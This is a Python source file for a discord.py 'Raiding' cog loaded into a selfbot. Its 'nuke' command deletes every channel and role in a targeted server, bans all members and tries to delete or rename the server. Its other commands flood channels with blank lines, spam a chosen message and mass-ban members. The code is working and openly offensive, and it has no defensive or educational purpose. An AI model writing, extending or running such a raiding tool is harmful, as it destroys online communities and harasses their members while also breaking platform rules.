from discord.ext import commands
import discord
import string
import random

class Raiding(commands.Cog):
    def __init__(self, selfbot):
        self.selfbot = selfbot

    @commands.command(name='nuke')
    async def nuke(self, ctx, server_id):
        guild = self.selfbot.get_guild(int(server_id))
        guild_name = guild.name
        for channel in guild.channels:
            try:
                await channel.delete(reason=None)
            except:
                pass
        for role in guild.roles:
            try:
                await role.delete(reason=None)
            except:
                pass
        for member in guild.members:
            if member.id != self.selfbot.user.id:
                try:
                    await member.ban()
                except:
                    pass
        try:
            await guild.delete(reason=None)
        except:
            pass
        try:
            await guild.edit(name=''.join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(5, 10))), icon=None, banner=None, splash=None)
        except:
            pass
        await ctx.send(f'nuked `{guild_name}`')

    @commands.command()
    async def junk(self, ctx):
        for _ in range(0, 11):
            d = "᲼\n"*100
            await ctx.send(f"{d}")
    
    @commands.command()
    async def spam(self, ctx, text, times):
        for _ in range(int(times)):
            await ctx.send(text)
        await ctx.send("done", delete_after=0.1)
    
    @commands.command()
    async def ban_all(self, ctx):
        for member in ctx.guild.members:
            await member.ban(reason=None)
        

def setup(selfbot):
    selfbot.add_cog(Raiding(selfbot))